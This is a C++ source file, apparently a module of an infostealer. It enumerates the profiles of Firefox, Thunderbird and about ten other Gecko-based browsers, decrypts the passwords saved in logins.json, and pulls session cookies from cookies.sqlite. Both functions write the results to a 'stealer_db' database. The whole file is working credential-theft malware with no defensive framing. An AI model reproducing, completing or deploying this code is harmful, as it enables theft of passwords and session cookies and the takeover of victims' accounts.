#include "includes\GeckoParser.h"

std::string gecko_paths = "AppData\\Roaming\\";
std::vector<std::string> browsers_gecko = {
	"Mozilla\\Firefox\\",
	"Thunderbird\\",
	"Mozilla\\SeaMonkey\\",
	"NETGATE Technologies\\BlackHawk\\",
	"8pecxstudios\\Cyberfox\\",
	"K-Meleon\\",
	"Mozilla\\icecat\\",
	"Moonchild Productions\\Pale Moon\\",
	"Comodo\\IceDragon\\",
	"Waterfox\\", 
	"Postbox\\",
	"Flock\\Browser\\"
};

BOOL gecko_parser(std::string username, std::string stealer_db)
{
	std::vector<DataHolder> data_list;

	std::string target_user_data;
	for (const auto& dir : browsers_gecko) {
		target_user_data = "C:\\users\\" + username + "\\" + gecko_paths + dir + "Profiles";
		try {
			if (exists(target_user_data) && is_directory(target_user_data)) {
				for (const auto& entry : directory_iterator(target_user_data)) {
					if (entry.is_directory() && exists(entry.path() / "logins.json")) {

						// Read the JSON file
						std::ifstream file(entry.path() / "logins.json");
						if (!file.is_open()) {
							std::cerr << "Failed to open file.\n";
							return false;
						}

						// Parse the JSON
						json data;
						file >> data;

						// Create decryptor object
						GeckoDecryptor obj;
						std::string program_dir = get_gecko_program_dir(entry.path().string());

						if (!obj.GeckoDecryptorInit(program_dir)) { continue; }

						if (!obj.set_profile_dir(entry.path().string())) { continue; }

						// Loop through all logins
						for (const auto& login : data["logins"]) {

							DataHolder data;

							// Extract fields for each login
							std::string hostname = login["hostname"];
							std::string username = login["encryptedUsername"];
							std::string password = login["encryptedPassword"];

							//data_array[data_index].setUrl(hostname);
							data.get_password_manager().setUrl(hostname);

							obj.decrypt_data(username, username);
							obj.decrypt_data(password, password);

							data.get_password_manager().setUsername(username);
							data.get_password_manager().setPassword(password);
							data.get_password_manager().setHost(dir);

							data_list.push_back(data);
						}
					}
				}
			}
		}
		catch (const std::filesystem::filesystem_error& e) {
			//std::cerr << "Filesystem error: " << e.what() << '\n';
		}
		catch (const std::exception& e) {
			//std::cerr << "General exception: " << e.what() << '\n';
		}
	}

	if (!dump_password_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}

BOOL gecko_cookie_collector(std::string username, std::string stealer_db)
{
	std::vector<DataHolder> data_list;

	std::string target_user_data;
	std::string target_cookie_data;
	for (const auto& dir : browsers_gecko) {

		target_user_data = "C:\\users\\" + username + "\\" + gecko_paths + dir + "Profiles";
		try {
			if (exists(target_user_data) && is_directory(target_user_data)) {
				for (const auto& entry : directory_iterator(target_user_data)) {
					if (entry.is_directory() && exists(entry.path() / "cookies.sqlite")) {
						//std::cout << entry.path() << '\n';

						target_cookie_data = entry.path().string() + "\\cookies.sqlite";
						sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT  host, name, path, value, expiry FROM moz_cookies");

						if (stmt == nullptr)
							continue;

						while (sqlite3_step(stmt) == SQLITE_ROW)
						{
							DataHolder data;

							char* host = (char*)sqlite3_column_text(stmt, 0);
							char* name = (char*)sqlite3_column_text(stmt, 1);
							char* path = (char*)sqlite3_column_text(stmt, 2);
							char* value = (char*)sqlite3_column_text(stmt, 3);
							char* expiry = (char*)sqlite3_column_text(stmt, 4);

							if (host != nullptr && name != nullptr && path != nullptr && value != nullptr && expiry != nullptr) {

								data.get_cookies_manager().setUrl(host);
								data.get_cookies_manager().setHost(dir);
								data.get_cookies_manager().setCookieName(name);
								data.get_cookies_manager().setCookies(value);
								data.get_cookies_manager().setCookiesExpiry(expiry);

								data_list.push_back(data);
							}
							else {
								// Handle the case where no data is fetched
								continue;
							}
						}
					}
				}
			}
		}
		catch (const std::filesystem::filesystem_error& e) {
			//std::cerr << "Filesystem error: " << e.what() << '\n';
		}
		catch (const std::exception& e) {
			//std::cerr << "General exception: " << e.what() << '\n';
		}
	}

	if (!dump_cookie_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}

std::string get_gecko_program_dir(std::string target_user_data)
{
	std::ifstream file(target_user_data + "\\compatibility.ini");
	if (!file.is_open()) {
		//std::cerr << "Could not open the file" << std::endl;
		return "";
	}

	std::string line;
	const std::string key = "LastPlatformDir=";
	while (std::getline(file, line)) {
		if (line.compare(0, key.size(), key) == 0) {
			// Found the key, extract the value
			return line.substr(key.size());
		}
	}

	std::cerr << "LastPlatformDir not found in the file" << std::endl;
	return "";
}